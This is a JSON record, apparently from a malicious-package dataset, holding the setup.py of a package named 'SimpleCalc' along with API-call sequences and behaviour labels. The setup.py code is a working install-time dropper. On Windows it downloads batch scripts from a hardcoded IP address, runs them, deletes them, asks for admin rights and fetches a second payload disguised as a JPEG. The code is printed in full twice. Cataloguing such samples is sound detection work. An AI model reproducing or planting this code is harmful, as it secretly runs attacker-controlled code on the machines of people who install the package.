[
  {
    "pyfile": "setup.py",
    "code_snippet": "if os.name == 'nt':\n  import base64\n  from time import sleep\n  try:\n    import subprocess\n    a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    out = (a.stdout.read().decode().strip())\n    os.chdir(out)\n    try:\n      import requests\n    except:\n      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE,\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      print(\"installing....\")\n      sleep(5)\n      import requests\n    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'\n    local_file = 'local_copy.txt'\n    data = requests.get(remote_url)\n    # Save file data to local copy\n    with open(local_file, 'wb')as file:\n      file.write(data.content)\n    subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # try:\n    #   subprocess.Popen(\"cmd /c break>local.bat:Zone.Identifier\", shell=True, stdin=subprocess.PIPE,\n    #                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    # except:\n    #   pass\n    subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    sleep(2)\n    try:\n      subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    except:\n      pass\n    a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stderr.read().decode())\n    if \"Access is denied.\" in out:\n      print(\"The library can do problems, Reinstall with Administrative permissions to solve the problem\")\n    else:\n      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'\n      local_file = 'local_b.txt'\n      data = requests.get(remote_url)\n      # Save file data to local copy\n      with open(local_file, 'wb')as file:\n        file.write(data.content)\n      subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                       stderr=subprocess.PIPE)\n      sleep(2)\n      try:\n        subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE,\n                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      except:\n        pass\n        print(\"\"\"installed successfully\n#Usage: import requests\n            \"\"\")\n  except Exception as e:\n      pass",
    "pattern_analysis": {
      "api_sequence": [
        "os.name",
        "subprocess.Popen",
        "subprocess.Popen.stdout.read",
        "os.chdir",
        "subprocess.check_call",
        "time.sleep",
        "requests.get",
        "open",
        "file.write",
        "subprocess.Popen",
        "subprocess.Popen",
        "time.sleep",
        "subprocess.Popen",
        "subprocess.Popen.stderr.read",
        "requests.get",
        "open",
        "file.write",
        "subprocess.Popen",
        "subprocess.Popen",
        "time.sleep",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "os.name",
        "subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "subprocess.Popen.stdout.read().decode().strip()",
        "os.chdir(out)",
        "subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "time.sleep(5)",
        "requests.get(remote_url)",
        "open(local_file, 'wb')",
        "file.write(data.content)",
        "subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "time.sleep(2)",
        "subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stderr.read().decode()",
        "requests.get(remote_url)",
        "open(local_file, 'wb')",
        "file.write(data.content)",
        "subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
        "time.sleep(2)",
        "subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen.stdout.read",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "os.chdir",
          "id": "change_working_dir",
          "description": "Changes current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "subprocess.check_call",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen.stderr.read",
          "id": "read_process_stderr",
          "description": "Reads all bytes from process standard error",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "if os.name == 'nt':\n  import base64\n  from time import sleep\n  try:\n    import subprocess\n    a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stdout.read().decode().strip())\n    os.chdir(out)\n    try:\n      import requests\n    except:\n      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      sleep(5)\n      import requests\n    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'\n    local_file = 'local_copy.txt'\n    data = requests.get(remote_url)\n    with open(local_file, 'wb')as file:\n      file.write(data.content)\n    subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    sleep(2)\n    try:\n      subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    except:\n      pass\n    a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stderr.read().decode())\n    if \"Access is denied.\" in out:\n      print(\"The library can do problems, Reinstall with Administrative permissions to solve the problem\")\n    else:\n      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'\n      local_file = 'local_b.txt'\n      data = requests.get(remote_url)\n      with open(local_file, 'wb')as file:\n        file.write(data.content)\n      subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      sleep(2)\n      try:\n        subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      except:\n        pass"
    }
  },
  {
    "metadata": {
      "package_name": "SimpleCalc-2022-4.2.21"
    }
  }
]